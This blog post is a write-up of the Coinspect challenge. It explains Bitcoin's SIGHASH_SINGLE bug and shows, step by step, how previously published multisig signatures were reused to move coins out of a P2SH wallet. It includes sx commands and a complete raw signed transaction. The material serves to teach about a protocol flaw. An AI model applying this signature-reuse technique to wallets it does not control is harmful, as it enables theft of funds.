---
layout: post
title: "Coinspect OP_CHECKSIG challenge"
description: ""
category: 
tags: [bitcoin, OP_CHECKSIG]
---

### Introduction

The challenge consisted in taking the bitcoins from a multisig wallet
or p2sh (pay to script hash):
[https://blockchain.info/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe](https://blockchain.info/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe)

I'm making this post as short as possible, for understanding it, you
may need previous knowledge about bitcoin internals.

### Understanding OP_CHECKSIG

This is a fuzzy and complicated part of bitcoin. It's explained
[here](https://bitcointalk.org/index.php?topic=260595.0).

When OP_CHECKSIG is reached in a script it needs that the public key
and the signature are in the stack. It takes the hash type from the
signature's last byte and depending on it, takes a different approach
to verifying the signature.

The internals of this opcode is, having the transaction serialized,
strip parts of it depending on the hash type, hashing it and then
comparing that the signature is valid for that hash and for the public
key provided in the stack.

In the case of this challenge a P2SH address is provided. It means
that it scriptSig consists of many signatures and a redeem script.

This redeem script contains the public keys that can be used and how
many of them are neccesary for validating the script. In this example
needs 2 of the 3.

```
{2 [pubkey1] [pubkey2] [pubkey3] 3 OP_CHECKMULTISIG}
```

The OP\_CHECKMULTISIG opcode runs OP\_CHECKSIG for every
signature available. If those signatures are good, then it returns
True. If any of them fail, it returns False.

### Bug in SIGHASH\_SINGLE

In case the signature ends with **03**, then SIGHASH\_SINGLE mode is
choosen.

This mode is supposed to strip the other outputs that doesn't
correspond to the same index of the input before hashing the
transaction and checking that the signature is valid.

The problem is that this mode is supposed to sign only one output, the
output that is in the same index as this input. In case there are less
outputs than inputs, then it should probably fail. But because a bug
in the initial implementation of bitcoind, it was validating it and
signing a hardcoded hash.

From the bitcoin wiki, it describes that if there is no output in the
same index of the input, then the hash of the transaction assumed to
be signed is
"0000000000000000000000000000000000000000000000000000000000000001".
(there is a whole thread about this behavior [here](
https://bitcointalk.org/index.php?topic=260595.0)).  This invalidates
the fact of a signature, because no inputs nor outputs are signed but
instead, a hard-coded string is.

It means that this signature can be reused in case we need to sign
000..01 again.

### The challenge

Going back to the coinspect's wallet
32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe, we detect that there is already an
outgoing transaction:
[6102bfd4bad33443bcb99765c0751b6b8e4e65f4db4e3b65324c5e9e3dac8132](https://blockchain.info/tx/6102bfd4bad33443bcb99765c0751b6b8e4e65f4db4e3b65324c5e9e3dac8132).

The sigScript:

```
0
3045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c2903
304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803
5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae
```

So we start analyzing the inputs and detect that these are multisigned
(2 of 3) and as the signatures end with **03**, correspond to
SIGHASH\_SINGLE working mode.

The last input doesn't have a corresponding output, so it means that
the last input's signatures are signing the hash 000..01, so we can
reuse those same signatures in case we need to sign the hardcoded hash
again.

With that signature we can sign any input which index is bigger than
the amount of outputs. In case we are using one output, that leaves us
with the input at index 0 to be external to that address because we
can not reuse the signatures for it. We are adding an input from an
address we control with the smallest mount possible.

### Example

I'm using sx for the example.

Create a new transaction with the first input from an address I
control and the other 2 with inputs from the coinspect's wallet:

```
$ sx mktx txfile.tx -i 2073da15a26ac66043914f5d3936058565318b332e793719456cc0405c87b450:0 -i 969bfb1704f1dc8e6157bf56ea794e16e6d9b88ca5cbff6e12d0797400b8835c:1 -i 9bf39fbf0f89c869585fb59acb2bfec5e2f57069b81021b967a7269a2c873f63:0 -o 197iAesReT4Z6chRqnsficr3LQpVxBdv1J:3100000
Added input 2073da15a26ac66043914f5d3936058565318b332e793719456cc0405c87b450:0
Added input 969bfb1704f1dc8e6157bf56ea794e16e6d9b88ca5cbff6e12d0797400b8835c:1
Added input 9bf39fbf0f89c869585fb59acb2bfec5e2f57069b81021b967a7269a2c873f63:0
Added output sending 3100000 Satoshis to 197iAesReT4Z6chRqnsficr3LQpVxBdv1J.
```

Now create the script for the first input signing it and adding my
public key:

```
$ DECODED_ADDR=$(cat private.key | sx addr | sx decode-addr)
$ PREVOUT_SCRIPT=$(sx rawscript dup hash160 [ $DECODED_ADDR ] equalverify checksig)
$ SIGNATURE=$(cat private.key | sx sign-input txfile.tx 0 $PREVOUT_SCRIPT)
$ SCRIPT=$(sx rawscript [ $SIGNATURE ] [ $(cat private.key | sx pubkey) ])
$ sx set-input txfile.tx 0 $SCRIPT > signedtx
```

Now I will add the reused signature for the other two inputs, those
inputs don't have a corresponding output, so they only need to sign
000..01, which we already have the signature for:

```
$ SIGN_1=3045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c2903 
$ SIGN_2=304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803
$ REDEEM_SCRIPT=5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae

$ REUSED_SCRIPT=$(sx rawscript zero [ $SIGN_1 ] [ $SIGN_2 ] [ $REDEEM_SCRIPT ])

$ sx set-input signed-tx 1 $REUSED_SCRIPT > signed-tx2 
$ sx set-input signed-tx2 2 $REUSED_SCRIPT > signed-tx_final
```

So now we have the transaction complete and ready to broadcast. I did
it on blockr.io because blockchain was complaining about the script
containing 4 instructions instead of 2.

```
$ cat signed-tx_final
010000000350b4875c40c06c451937792e338b3165850536395d4f914360c66aa215da7320000000008a473044022043dfdc32cbe03f06200d4f1da806336cb79565c482432e60a6ad0c55dbb5947b02201cd22de62cf8ffc09288ff87ccac93038978e4d9d746b41bfb07614ce161f472014104e824c125eb482debade1f47f0225959b0e15fc667fd281b8e1cc99e08a5ab2285583d6fdcc6b61906d454249a76e666bd03e883df017054a04cc77d1b7dce92dffffffff5c83b8007479d0126effcba58cb8d9e6164e79ea56bf57618edcf10417fb9b9601000000fdfd0000483045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c290347304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b8034c695221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53aeffffffff633f872c9a26a767b92110b86970f5e2c5fe2bcb9ab55f5869c8890fbf9ff39b00000000fdfd0000483045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c290347304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b8034c695221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53aeffffffff01604d2f00000000001976a9145905ddb52ed55abc9f8f4a58a8323296c642e93288ac00000000

$ sx showtx signed-tx_final 
hash: 32aadcd309ea3fb30bd9490ee6417e378dad5111c21563ce532a6917b776051b
version: 1
locktime: 0
Input:
  previous output: 2073da15a26ac66043914f5d3936058565318b332e793719456cc0405c87b450:0
  script: [ 3044022043dfdc32cbe03f06200d4f1da806336cb79565c482432e60a6ad0c55dbb5947b02201cd22de62cf8ffc09288ff87ccac93038978e4d9d746b41bfb07614ce161f47201 ] [ 04e824c125eb482debade1f47f0225959b0e15fc667fd281b8e1cc99e08a5ab2285583d6fdcc6b61906d454249a76e666bd03e883df017054a04cc77d1b7dce92d ]
  sequence: 4294967295
  address: 16LvhDHHrcGXEeHtYu6W99kwptuS6Vp59B
Input:
  previous output: 969bfb1704f1dc8e6157bf56ea794e16e6d9b88ca5cbff6e12d0797400b8835c:1
  script: zero [ 3045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c2903 ] [ 304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803 ] [ 5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae ]
  sequence: 4294967295
  address: 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe
Input:
  previous output: 9bf39fbf0f89c869585fb59acb2bfec5e2f57069b81021b967a7269a2c873f63:0
  script: zero [ 3045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c2903 ] [ 304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803 ] [ 5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae ]
  sequence: 4294967295
  address: 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe
Output:
  value: 3100000
  script: dup hash160 [ 5905ddb52ed55abc9f8f4a58a8323296c642e932 ] equalverify checksig
  address: 197iAesReT4Z6chRqnsficr3LQpVxBdv1J
```